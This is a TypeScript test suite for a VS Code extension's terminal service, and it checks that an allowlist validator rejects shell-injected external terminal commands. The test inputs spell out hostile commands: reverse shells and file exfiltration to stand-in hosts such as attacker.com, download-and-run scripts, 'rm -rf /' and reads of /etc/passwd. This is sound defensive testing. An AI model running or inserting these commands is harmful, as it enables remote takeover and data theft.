import * as assert from 'assert';
import * as path from 'path';
import * as vscode from 'vscode';
import { TerminalService } from '../../../src/services/terminalService';
import { TestSetup, TestHelpers } from '../utils/testSetup';

suite('TerminalService Tests', () => {
  let terminalService: TerminalService;

  setup(() => {
    // Reset TerminalService singleton before each test to ensure clean state
    (TerminalService as any).instance = null;
    // Force mocks even when running in VS Code test environment
    TestSetup.setup(undefined, true);
    terminalService = TestSetup.createTerminalService();
  });

  teardown(() => {
    // Force restore even when running in VS Code test environment
    TestSetup.teardown(true);
    (TerminalService as any).instance = null;
  });

  suite('Path Resolution', () => {
    test('should get parent directory correctly', () => {
      const paths = TestHelpers.getTestPaths();
      const parentDir = terminalService.getParentDirectory(paths.unixFile);
      assert.strictEqual(parentDir, '/home/user/project/src');
    });



    test('should get parent directory for target behavior', () => {
      const service = TestHelpers.setupWithOpenBehavior('parent-directory');
      const paths = TestHelpers.getTestPaths();
      const targetDir = service.getTargetDirectory(paths.unixFile);
      assert.strictEqual(targetDir, '/home/user/project/src');
    });

    test('should get workspace root for target behavior', () => {
      const service = TestHelpers.setupWithOpenBehavior('workspace-root');
      const paths = TestHelpers.getTestPaths();
      const targetDir = service.getTargetDirectory(paths.unixFile);
      assert.strictEqual(targetDir, '/home/user/project');
    });

    test('should get current directory for target behavior', () => {
      const service = TestHelpers.setupWithOpenBehavior('current-directory');
      const paths = TestHelpers.getTestPaths();
      const targetDir = service.getTargetDirectory(paths.unixFile);
      assert.strictEqual(targetDir, paths.unixFile);
    });

  });

  suite('Path Validation', () => {
    test('should validate existing directory', async () => {
      const paths = TestHelpers.getTestPaths();
      TestSetup.addFile(paths.workspaceRoot, true);

      const isValid = await terminalService.validatePath(paths.workspaceRoot);
      assert.strictEqual(isValid, true);
    });

    test('should reject non-existent directory', async () => {
      const paths = TestHelpers.getTestPaths();
      const isValid = await terminalService.validatePath(paths.nonExistentFile);
      assert.strictEqual(isValid, false);
    });

    test('should reject file path as directory', async () => {
      const paths = TestHelpers.getTestPaths();
      TestSetup.addFile(paths.unixFile, false); // Add as file, not directory

      const isValid = await terminalService.validatePath(paths.unixFile);
      assert.strictEqual(isValid, false);
    });

  });

  suite('Terminal Type Configuration', () => {
    test('should default to integrated terminal type', () => {
      const terminalType = terminalService.getTerminalType();
      assert.strictEqual(terminalType, 'integrated');
    });

    test('should return configured terminal type - external', () => {
      const service = TestHelpers.setupExternalTerminal();
      const terminalType = service.getTerminalType();
      assert.strictEqual(terminalType, 'external');
    });

    test('should return configured terminal type - system-default', () => {
      const service = TestHelpers.setupSystemDefaultTerminal();
      const terminalType = service.getTerminalType();
      assert.strictEqual(terminalType, 'system-default');
    });

  });

  suite('Terminal Creation', () => {
    test('should create integrated terminal successfully', async () => {
      const workspaceFolders = vscode.workspace.workspaceFolders;
      if (workspaceFolders && workspaceFolders.length > 0) {
        const workspaceDir = workspaceFolders[0]!.uri.fsPath;
        const initialTerminalCount = vscode.window.terminals.length;

        try {
          await terminalService.openDirectoryInTerminal(workspaceDir);

          const newTerminalCount = vscode.window.terminals.length;
          assert.strictEqual(newTerminalCount, initialTerminalCount + 1);

          const latestTerminal = vscode.window.terminals[vscode.window.terminals.length - 1];
          if (latestTerminal) {
            assert.ok(latestTerminal.name.includes('Terminal'));
          }

        } catch (error) {
          assert.fail(`Failed to create integrated terminal: ${error}`);
        }
      } else {
        console.log('Skipping terminal creation test - no workspace folders available');
      }
    });

  });



  suite('Integration Tests', () => {
    test('should complete full workflow for valid file', async () => {
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      const initialTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();

      await terminalService.openInTerminal(paths.unixFile);

      const newTerminalCount = TestSetup.getMocks().vscode.getTerminalCount();
      assert.strictEqual(newTerminalCount, initialTerminalCount + 1);

      TestHelpers.assertTerminalCreated('Terminal', parentDir);
      TestHelpers.assertInfoMessage('Terminal opened');
    });

    test('should work with different open behaviors', async () => {
      const behaviors: Array<'parent-directory' | 'workspace-root' | 'current-directory'> = [
        'parent-directory',
        'workspace-root',
        'current-directory'
      ];

      for (const behavior of behaviors) {
        const service = TestHelpers.setupWithOpenBehavior(behavior);
        const paths = TestHelpers.getTestPaths();

        // Setup required directories
        TestSetup.addFile(path.dirname(paths.unixFile), true);
        TestSetup.addFile(paths.workspaceRoot, true);
        TestSetup.addFile(paths.unixFile, false);

        const targetDir = service.getTargetDirectory(paths.unixFile);
        TestSetup.addFile(targetDir, true);

        await service.openInTerminal(paths.unixFile);

        TestHelpers.assertTerminalCreated('Terminal');
      }
    });


  });

  suite('Configuration Integration', () => {
    test('should respond to configuration changes', () => {
      // Test initial config
      assert.strictEqual(terminalService.getTerminalType(), 'integrated');

      // Update config and test change
      TestSetup.updateConfig({
        terminal: {
          type: 'external',
          externalTerminalCommand: 'test-command',
          openBehavior: 'workspace-root'
        }
      });

      assert.strictEqual(terminalService.getTerminalType(), 'external');
    });

  });

  suite('isCommandSafe Validation', () => {
    // Helper to access private isCommandSafe method
    function callIsCommandSafe(service: TerminalService, command: string): boolean {
      return (service as any).isCommandSafe(command);
    }

    const originalPlatform = process.platform;

    setup(() => {
      // Reset TerminalService singleton
      (TerminalService as any).instance = null;
    });

    teardown(() => {
      // Restore original platform and clean up
      Object.defineProperty(process, 'platform', { value: originalPlatform });
      (TerminalService as any).instance = null;
    });

    suite('Valid Commands', () => {
      test('should accept valid Linux terminal commands', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const validCommands = [
          'gnome-terminal',
          'gnome-terminal --working-directory={{directory}}',
          'konsole',
          'konsole --workdir {{directory}}',
          'xfce4-terminal',
          'xfce4-terminal --working-directory={{directory}}',
          'xterm',
          'alacritty',
          'terminator',
          'kitty',
          'urxvt',
          'rxvt',
          'uxterm',
          'mate-terminal',
          'lxterminal',
          'terminology',
          'st',
          'wezterm',
          'wezterm-gui',
        ];

        for (const command of validCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command should be safe: ${command}`);
        }
      });

      test('should accept valid macOS terminal commands', () => {
        Object.defineProperty(process, 'platform', { value: 'darwin' });
        const service = TerminalService.getInstance();

        const validCommands = [
          'Terminal',
          'iTerm',
          'iTerm2',
          'Alacritty',
          'kitty',
          'WezTerm',
        ];

        for (const command of validCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command should be safe: ${command}`);
        }
      });

      test('should accept valid Windows terminal commands', () => {
        Object.defineProperty(process, 'platform', { value: 'win32' });
        const service = TerminalService.getInstance();

        const validCommands = [
          'cmd.exe',
          'powershell.exe',
          'pwsh.exe',
          'WindowsTerminal.exe',
          'wt.exe',
          'conhost.exe',
        ];

        for (const command of validCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command should be safe: ${command}`);
        }
      });

      test('should accept commands with full path to executable', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const validCommands = [
          '/usr/bin/gnome-terminal --working-directory={{directory}}',
          '/usr/local/bin/konsole',
          '/opt/terminal/alacritty',
        ];

        for (const command of validCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command should be safe: ${command}`);
        }
      });

      test('should accept commands with safe arguments', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const safeCommands = [
          'gnome-terminal --working-directory={{directory}}',
          'konsole --workdir {{directory}}',
          'xfce4-terminal --working-directory={{directory}} --title=Terminal',
          'alacritty --working-directory {{directory}}',
        ];

        for (const command of safeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command should be safe: ${command}`);
        }
      });
    });

    suite('Invalid Commands - Allowlist Enforcement', () => {
      test('should reject commands not in allowlist', () => {
        const service = TerminalService.getInstance();

        const invalidCommands = [
          'malicious-command',
          'rm',
          'cat',
          'bash',
          'sh',
          'python',
          'node',
          'npm',
          'unknown-terminal',
        ];

        for (const command of invalidCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command should be rejected: ${command}`);
        }
      });

      test('should reject commands with full path to non-allowlisted executable', () => {
        const service = TerminalService.getInstance();

        const invalidCommands = [
          '/usr/bin/rm',
          '/bin/bash',
          '/usr/local/bin/malicious',
          '/home/user/.local/bin/evil',
        ];

        for (const command of invalidCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command should be rejected: ${command}`);
        }
      });

      test('should reject Windows-specific commands on Linux', function() {
        // Skip this test on Windows since it tests Linux behavior
        if (process.platform === 'win32') {
          this.skip();
        }

        const service = TerminalService.getInstance();

        const windowsCommands = [
          'cmd.exe',
          'powershell.exe',
          'wt.exe',
        ];

        for (const command of windowsCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Windows command should be rejected on Linux: ${command}`);
        }
      });

      test('should reject Linux-specific commands on Windows', function() {
        // Skip this test on non-Windows since it tests Windows behavior
        if (process.platform !== 'win32') {
          this.skip();
        }

        const service = TerminalService.getInstance();

        const linuxCommands = [
          'gnome-terminal',
          'konsole',
          'xterm',
          'alacritty',
        ];

        for (const command of linuxCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Linux command should be rejected on Windows: ${command}`);
        }
      });
    });

    suite('Invalid Commands - Shell Metacharacters', () => {
      test('should reject commands with semicolons', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal; rm -rf /',
          'gnome-terminal ; cat /etc/passwd',
          'gnome-terminal;malicious',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with semicolon should be rejected: ${command}`);
        }
      });

      test('should reject commands with command separators', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal && rm -rf /',
          'gnome-terminal& malicious',
          'gnome-terminal|| cat /etc/passwd',
          'gnome-terminal | evil',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with separator should be rejected: ${command}`);
        }
      });

      test('should reject commands with pipes', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal | cat',
          'gnome-terminal| grep secret',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with pipe should be rejected: ${command}`);
        }
      });

      test('should reject commands with redirects', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal > /tmp/output.txt',
          'gnome-terminal < /tmp/input.txt',
          'gnome-terminal>> /tmp/append.txt',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with redirect should be rejected: ${command}`);
        }
      });

      test('should reject commands with command substitution', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal $(rm -rf /)',
          'gnome-terminal `touch /tmp/pwned`',
          'gnome-terminal ${HOME}',
          'gnome-terminal$(cat /etc/passwd)',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with substitution should be rejected: ${command}`);
        }
      });

      test('should reject commands with variable expansion', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal $HOME',
          'gnome-terminal $USER',
          'gnome-terminal ${PATH}',
          'gnome-terminal$HOME/evil',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with variable should be rejected: ${command}`);
        }
      });

      test('should reject commands with newlines', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal\nrm -rf /',
          'gnome-terminal\rmalicious',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with newline should be rejected: ${command}`);
        }
      });

      test('should reject commands with parentheses', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal (evil)',
          'gnome-terminal(subcommand)',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with parentheses should be rejected: ${command}`);
        }
      });

      test('should reject commands with square brackets', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal [evil]',
          'gnome-terminal[a-z]',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with brackets should be rejected: ${command}`);
        }
      });

      test('should reject commands with curly braces', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal {evil}',
          'gnome-terminal{a,b,c}',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with braces should be rejected: ${command}`);
        }
      });

      test('should reject commands with wildcards', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal *',
          'gnome-terminal ?',
          'gnome-terminal *.txt',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with wildcards should be rejected: ${command}`);
        }
      });

      test('should reject commands with exclamation marks', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal !',
          'gnome-terminal!important',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with exclamation should be rejected: ${command}`);
        }
      });

      test('should reject commands with tilde', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal ~',
          'gnome-terminal~/evil',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with tilde should be rejected: ${command}`);
        }
      });

      test('should reject commands with hash (comment)', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal # evil',
          'gnome-terminal#comment',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with hash should be rejected: ${command}`);
        }
      });

      test('should reject commands with backslash (except Windows paths)', function() {
        // Skip on Windows since backslashes are allowed there
        if (process.platform === 'win32') {
          this.skip();
        }

        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'gnome-terminal \\',
          'gnome-terminal \\evil',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with backslash should be rejected on Linux: ${command}`);
        }
      });

      test('should allow backslash in Windows drive letters', function() {
        // Only run on Windows
        if (process.platform !== 'win32') {
          this.skip();
        }

        const service = TerminalService.getInstance();

        const safeCommand = 'C:\\Windows\\System32\\cmd.exe';
        const isSafe = callIsCommandSafe(service, safeCommand);
        assert.strictEqual(isSafe, true, `Windows path with backslash should be safe: ${safeCommand}`);
      });

      test('should reject commands with caret on Windows', function() {
        // Only run on Windows
        if (process.platform !== 'win32') {
          this.skip();
        }

        const service = TerminalService.getInstance();

        const unsafeCommands = [
          'cmd.exe ^',
          'cmd.exe^evil',
        ];

        for (const command of unsafeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Command with caret should be rejected on Windows: ${command}`);
        }
      });
    });

    suite('Edge Cases', () => {
      test('should reject empty commands', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const isSafe = callIsCommandSafe(service, '');
        assert.strictEqual(isSafe, false, 'Empty command should be rejected');
      });

      test('should reject whitespace-only commands', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const whitespaceCommands = ['   ', '\t', '\n', ' \t\n '];
        for (const command of whitespaceCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Whitespace-only command should be rejected: "${command}"`);
        }
      });

      test('should handle commands with leading/trailing whitespace', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const commands = [
          '  gnome-terminal',
          'gnome-terminal  ',
          '  gnome-terminal  ',
        ];

        for (const command of commands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command with whitespace should be trimmed and safe: "${command}"`);
        }
      });

      test('should reject complex injection attempts', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const injectionAttempts = [
          'gnome-terminal; curl http://evil.com/shell.sh | bash',
          'gnome-terminal && nc -e /bin/sh attacker.com 4444',
          'gnome-terminal| tee /tmp/output',
          'gnome-terminal`whoami`',
          'gnome-terminal$(wget http://evil.com/bad.sh)',
          'gnome-terminal\nexport EVIL=true',
          'gnome-terminal\r\nmalicious',
          'gnome-terminal --title="; rm -rf /;"',
          'gnome-terminal --title=$(evil)',
        ];

        for (const command of injectionAttempts) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, false, `Complex injection should be rejected: ${command}`);
        }
      });

      test('should handle unknown platform gracefully', () => {
        Object.defineProperty(process, 'platform', { value: 'unknown' });
        const service = TerminalService.getInstance();

        const isSafe = callIsCommandSafe(service, 'gnome-terminal');
        assert.strictEqual(isSafe, false, 'Unknown platform should reject all commands');
      });

      test('should accept commands with double quotes (in arguments)', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const safeCommands = [
          'gnome-terminal --title="My Terminal"',
          'konsole --workdir "{{directory}}"',
        ];

        for (const command of safeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command with quoted arguments should be safe: ${command}`);
        }
      });

      test('should accept commands with equals signs in arguments', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const safeCommands = [
          'gnome-terminal --working-directory=/home/user',
          'alacritty --directory=/tmp',
        ];

        for (const command of safeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command with equals should be safe: ${command}`);
        }
      });

      test('should accept commands with hyphens and underscores', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const safeCommands = [
          'gnome-terminal',
          'wezterm-gui',
          'alacritty',
        ];

        for (const command of safeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command with hyphens/underscores should be safe: ${command}`);
        }
      });

      test('should accept commands with dots in name', () => {
        Object.defineProperty(process, 'platform', { value: 'win32' });
        const service = TerminalService.getInstance();

        const safeCommands = [
          'cmd.exe',
          'powershell.exe',
          'pwsh.exe',
          'WindowsTerminal.exe',
        ];

        for (const command of safeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command with .exe should be safe: ${command}`);
        }
      });

      test('should handle template variable in commands', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const safeCommands = [
          'gnome-terminal --working-directory={{directory}}',
          'konsole --workdir {{directory}}',
          'xfce4-terminal --working-directory={{directory}}',
        ];

        for (const command of safeCommands) {
          const isSafe = callIsCommandSafe(service, command);
          assert.strictEqual(isSafe, true, `Command with {{directory}} should be safe: ${command}`);
        }
      });
    });

    suite('Platform-Specific Allowlists', () => {
      test('Linux allowlist should contain all expected terminals', () => {
        Object.defineProperty(process, 'platform', { value: 'linux' });
        const service = TerminalService.getInstance();

        const expectedTerminals = [
          'gnome-terminal', 'konsole', 'xfce4-terminal', 'xterm',
          'alacritty', 'terminator', 'kitty', 'urxvt', 'rxvt',
          'uxterm', 'mate-terminal', 'lxterminal', 'terminology',
          'st', 'wezterm', 'wezterm-gui',
        ];

        for (const terminal of expectedTerminals) {
          const isSafe = callIsCommandSafe(service, terminal);
          assert.strictEqual(isSafe, true, `Expected terminal in allowlist: ${terminal}`);
        }
      });

      test('macOS allowlist should contain all expected terminals', () => {
        Object.defineProperty(process, 'platform', { value: 'darwin' });
        const service = TerminalService.getInstance();

        const expectedTerminals = [
          'Terminal', 'iTerm', 'iTerm2', 'Alacritty', 'kitty', 'WezTerm',
        ];

        for (const terminal of expectedTerminals) {
          const isSafe = callIsCommandSafe(service, terminal);
          assert.strictEqual(isSafe, true, `Expected terminal in allowlist: ${terminal}`);
        }
      });

      test('Windows allowlist should contain all expected terminals', () => {
        Object.defineProperty(process, 'platform', { value: 'win32' });
        const service = TerminalService.getInstance();

        const expectedTerminals = [
          'cmd.exe', 'powershell.exe', 'pwsh.exe', 'WindowsTerminal.exe', 'wt.exe', 'conhost.exe',
        ];

        for (const terminal of expectedTerminals) {
          const isSafe = callIsCommandSafe(service, terminal);
          assert.strictEqual(isSafe, true, `Expected terminal in allowlist: ${terminal}`);
        }
      });
    });
  });

  suite('External Terminal Command Validation', () => {
    test('should accept valid terminal commands', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal --working-directory={{directory}}');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        const mocks = TestSetup.getMocks();
        const terminal = mocks.vscode.getLastCreatedTerminal();
        assert.ok(terminal, 'Terminal should be created for valid command');
      } catch (error) {
        assert.fail(`Should not throw error for valid command: ${error}`);
      }
    });

    test('should reject commands with shell metacharacters', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal; rm -rf /');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command with semicolon');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    test('should reject commands with command substitution', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal $(touch /tmp/pwned)');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command with command substitution');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    test('should reject commands with pipes', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal | cat');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command with pipe');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    test('should reject commands with redirects', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal > /tmp/output.txt');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command with redirect');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    test('should reject commands not in allowlist', async () => {
      const service = TestHelpers.setupExternalTerminal('malicious-command');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command not in allowlist');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    test('should reject empty commands', async () => {
      const service = TestHelpers.setupExternalTerminal('');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for empty command');
      } catch (error: any) {
        assert.ok(
          error.message.includes('No external terminal command configured') || error.message.includes('Failed to open external terminal'),
          `Expected empty command error, got: ${error.message}`
        );
      }
    });

    test('should accept valid Windows terminal commands on Windows', async () => {
      const originalPlatform = process.platform;
      try {
        Object.defineProperty(process, 'platform', { value: 'win32' });

        const service = TestHelpers.setupExternalTerminal('cmd.exe');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          const mocks = TestSetup.getMocks();
          const terminal = mocks.vscode.getLastCreatedTerminal();
          assert.ok(terminal, 'Terminal should be created for valid Windows command');
        } catch (error) {
          assert.fail(`Should not throw error for valid Windows command: ${error}`);
        }
      } finally {
        Object.defineProperty(process, 'platform', { value: originalPlatform });
      }
    });

    test('should reject commands with backtick substitution', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal `touch /tmp/pwned`');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command with backtick substitution');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    test('should reject commands with variable expansion', async () => {
      const service = TestHelpers.setupExternalTerminal('gnome-terminal $HOME');
      const paths = TestHelpers.getTestPaths();
      const parentDir = path.dirname(paths.unixFile);
      TestSetup.addFile(parentDir, true);

      try {
        await service.openDirectoryInTerminal(parentDir);
        assert.fail('Should have thrown error for command with variable expansion');
      } catch (error: any) {
        assert.ok(
          error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
          `Expected unsafe command error, got: ${error.message}`
        );
      }
    });

    suite('Sophisticated Attack Patterns', () => {
      test('should reject commands with chained injection attempts', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; rm -rf / && curl http://evil.com | bash');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for chained injection');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for chained injection, got: ${error.message}`
          );
        }
      });

      test('should reject commands with reverse shell attempts', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal && nc -e /bin/sh attacker.com 4444');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for reverse shell attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for reverse shell, got: ${error.message}`
          );
        }
      });

      test('should reject commands with data exfiltration attempts', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal | curl -X POST http://attacker.com -d @/etc/passwd');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for data exfiltration attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for data exfiltration, got: ${error.message}`
          );
        }
      });

      test('should reject commands with script download and execution', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal; wget http://evil.com/malware.sh -O /tmp/m.sh && bash /tmp/m.sh');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for script download attempt');
        } catch (error: any) {
          assert.ok(
            error.message.includes('Invalid or unsafe') || error.message.includes('Failed to open external terminal'),
            `Expected unsafe command error for script download, got: ${error.message}`
          );
        }
      });

      test('should reject commands with base64-encoded payloads', async () => {
        const service = TestHelpers.setupExternalTerminal('gnome-terminal $(echo "bWljcm9zb2Z0Cg==" | base64 -d)');
        const paths = TestHelpers.getTestPaths();
        const parentDir = path.dirname(paths.unixFile);
        TestSetup.addFile(parentDir, true);

        try {
          await service.openDirectoryInTerminal(parentDir);
          assert.fail('Should have thrown error for base64-encoded payload');
        } catch (error: any) {
